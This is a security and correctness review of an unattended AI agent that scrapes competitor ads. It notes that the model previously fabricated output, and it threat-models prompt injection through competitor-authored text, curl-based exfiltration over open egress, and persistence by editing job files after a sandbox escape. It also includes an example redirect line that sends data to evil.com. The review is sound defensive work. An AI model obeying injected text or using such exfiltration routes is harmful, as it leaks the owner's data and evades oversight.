# PASS 1 — CORRECTNESS

**HIGH — The three-check null regime never binds the page to the competitor.** `jobs/market-recon.md` Step 3d requires "the advertiser's name is on the page" — but the query is by *numeric ID*, so the name that appears is the name of *whatever page the ID belongs to*. The chain site-link → handle → page → ID has three silent-failure hops: competitors link old/merged/regional/dormant pages, link founders' pages, or publish two plausible Facebook links (the Step 3c.1 filter only excludes `/tr`, `/sharer`, `/plugins`, fbml — it says nothing about *choosing between* multiple page links). A wrong-but-real page renders the null message *plus that page's name* and the control passes: you write "NO_ADS" for the actual competitor with full verification theatre. Worse, the probe's output schema (`probe-meta-pageid.ps1`, `PAGE_ID: <digits>`) records digits only — the human auditor cannot reconstruct which page name was seen. Fix: require `PAGE_NAME_SEEN:` in the output and treat name≠business as a re-resolve, not a null.

**HIGH — country=US makes every null geographic, and the conclusions aren't.** Step 3c.3 hardcodes `country=US`. A null there means "no ads delivered into the US filter" — a UK/AU-only advertiser produces a clean, name-bearing, control-passing null. "Four competitors were confirmed to run no ads" is a stronger sentence than the instrument supports; it must read "no ads in US scope." Separately, nobody verified whether `view_all_page_id` even *respects* the country param — if it doesn't, the Step 2 keyword-mode country observations don't transfer to this query type. One of those two claims is load-bearing and unmeasured.

**HIGH — The control is positioned to pass.** In `probe-meta-pageid.ps1`, Tracy Anderson is the *first* entry in `$targets`. The control therefore runs in the healthiest window of the session — before ~20 rapid facebook.com navigations (challenge-clear ×2 per page × 6 targets × active/all retries) have had a chance to trigger progressive throttling. `CONTROL_WORKED: YES` is then computed from the earliest query and retroactively blesses the queries most likely to have degraded. A control that validates the pipeline at t=0 says nothing about t=15. Sandwich it — control first *and* last — and add a *negative* control (an ID known to have zero ads) to prove the null-render path works in the same session; right now a broken null path silently converts every genuine no-ads competitor into `[UNKNOWN]` with no way to distinguish it.

**HIGH — The longevity analysis is biased by design.** Step 3 / probe STEP 2 read "up to 5 ads" — the first five cards of an ordered result set with a non-random default sort. If the default is newest-first (check it), the longest-running creatives are on page 3 and `LONGEST_RUNNING:` is systematically wrong in the *short* direction. Compounding: "Started running on" resets when an ad is edited, and a start date is not evidence of *continuous* spend — "an ad running for months is a proven ad" treats a date string as a spend telemetry it isn't. And `RESULT_COUNT` counts *creatives/cards*, not campaigns; "runs ~62 ads" is not a business fact.

**MEDIUM — `active_status=all` ≠ "no ads ever."** Non-political inactive ads age out of the Ad Library; the ~20→~62 control observation proves `all` returns *more*, not that it returns *complete history*. "An advertiser with no ads ever" is a claim the instrument cannot make — only "no ads currently listed."

**MEDIUM — The verification regime is prose, and the previous fabrication was caught by a human who won't be there.** The 3,758-byte fabrication was caught by someone diffing byte counts offline. The remedy is *more prompt text* to the same model class. Under `-Yes` (unattended), nothing mechanically checks that the null message, the name, and the control actually appeared — the model attests to its own page reads, which is exactly the failure mode already observed. The harness never persists snapshots or HTML. Save the rendered DOM per query and grep it in PowerShell for the null string / count / expected name; make the check a gate the report can't bypass.

The production prompt (Step 3c.1) has the *agent* harvest handles live from arbitrary competitor HTML with a one-line instruction. # PASS 2 — SECURITY

**CRITICAL — The pipeline's core value operation is the injection vector.** By design, the agent quotes competitor-controlled text verbatim into context ("verbatim hook quote ≤ 25 words" — enough for a URL and an imperative), reads competitor homepage HTML raw during handle harvest (Step 3c.1 — a plain fetch of fully attacker-controlled bytes), and scrapes page HTML via `browser_evaluate`. The subjects of this recon are the *most motivated* attackers: a competitor who wants to know what a rival's crawler believes can plant instructions in ad primary text, page posts, or the homepage Facebook-link region. Execution side: `approval_policy="never"` + `default_tools_approval_mode="auto"` + shell access with **unsandboxed egress** (the launcher's own `caveat` field admits egress is open, but frames it as "a GET can change server state" — the real exposure is injected `curl`-based exfil of anything the process can read, and arbitrary POSTs). The standing constraint "nothing may post, send, buy, submit" is not *enforced anywhere* — it is prompt text on an unattended agent reading adversarial input. DRAFT&STAGE is currently unexercised, not guaranteed.

**HIGH — The write-boundary claim rests on a Windows sandbox of unverified strength — and its breach is a persistence primitive.** Swan-Ops.ps1 asserts "ONLY swan-ops\sandbox\ — cannot touch jobs\, logs\, or this launcher." That is codex `workspace-write` on native Windows, where OS sandboxing support is historically weak/experimental. If it's advisory, an injected run doesn't just exfil — it **edits `jobs/market-recon.md`**, planting standing instructions into every future run, or patches the launcher. That converts a one-shot injection into durable compromise of the workstream. One empirical test (try to write outside sandbox from a run) settles it; nothing in the packet shows it was run.

**HIGH — The origin allowlist is escaped by redirectors *on the allowed origins*, and the runtime disclosure misstates the list.** `BrowserPolicy.ps1` `$AdLibraryOrigins` includes `https://www.google.com` — all of Google Search — while `Write-BrowserDisclosure` tells the owner reach is "restricted to the two public ad libraries + their CDNs." The file that lectures itself about overstating protections overstates reach at runtime. Worse: both allowlisted hosts run public redirectors (`facebook.com/l.php?u=`, `google.com/url?q=`), and the file's own Playwright citation says allowed-origins "does not affect redirects." An injected `location.href='facebook.com/l.php?u=https://evil.com/?d='+data` is a plausible exfil channel *and* deanonymizes the researcher's IP into the attacker's redirect logs. Verify empirically; if redirect hops are re-checked, downgrade — but the disclosure-copy error stands either way.

**HIGH — Unpinned `@playwright/mcp@latest`.** `$pwArgs` resolves the MCP server from npm's tip on every unattended run. A hostile, typosquatted, or simply behaviour-changing release (e.g., allowed-origins semantics) ships straight into execution with browser control, no version recorded, no lockfile. Every careful measurement in this packet describes an unidentified version that may not be tomorrow's.

**HIGH — Anonymous state-change on allowed origins is one `browser_evaluate` away.** `--isolated` guarantees no *authenticated* identity — it does not guarantee no *actions*. Same-origin `fetch`/XHR POSTs from evaluate on `facebook.com`/`google.com`, ad-library report/feedback endpoints, Google account-creation prefills: all are "submit a form" in the owner's forbidden sense, all reachable, all ungated (the per-tool approve list is dead config, acknowledged). The disclosure's "bounded: cannot post, comment, DM, or buy as anyone" is true and beside the point — the constraint is submit-*nothing*, not submit-*nothing authenticated*.

**MEDIUM — Adversarial poisoning of the deliverable via the identity-binding gap** (Pass 1, finding 1, read as attack): a competitor who notices the crawler — its signature is loud: plain-fetch handle harvest, double-navigate challenge clear, `view_all_page_id` probes — publishes a chosen Facebook link and *manufactures a verified null or verified fake-ad profile for themselves*. The control validates the pipeline, not the binding, so it sails through. Your market intelligence is attacker-writable and your verification regime certifies it.

**MEDIUM — The challenge doctrine trains the agent to trust weird tiny pages.** Step 2b teaches "small strange page = benign, wait 8s, re-navigate, retry." An attacker who controls a competitor site (one already 403s non-browser requests) can serve a fake "challenge" page carrying instructions, riding a behaviour the prompt has normalized. Cheap, plausible, undetectable in the transcript.

**MEDIUM — Possible LAN/localhost reach from the browser.** If `--allowed-origins` gates navigations but not no-cors subresources, `img`/`fetch(no-cors)` beacons from a rendered page can fire CSRF-style GETs at `127.0.0.1` services and LAN devices (routers, dev servers) from the owner's machine. One test away from confirmed or moot; nobody ran it.

**LOW —** No timeout + injected "keep retrying" = spend-DoS; `-Yes` removes the last human glance at the disclosure before an unattended run against hostile input; logs persist full transcripts of adversary content; logged-out scraping at this cadence risks Meta flagging the owner's IP, killing future runs operationally; lastmsg cosmetic injection.

*Genuinely fine:* `--isolated` as the strongest control is the correct call and correctly identified; killing the bundled browser/chrome/computer-use plugins is the right move; the honesty about per-tool denial being non-functional is rare and valuable; the quoting/UTF-8/stderr handling in Swan-Ops.ps1 is carefully measured.

**The one-sentence version:** the correctness regime verifies that *a page rendered*, never that it's the *right page making the right claim in the right scope* — and the security posture assumes restraint from a model that reads adversary-authored text all day, quotes it verbatim, and holds a shell with open egress and no approval gate.
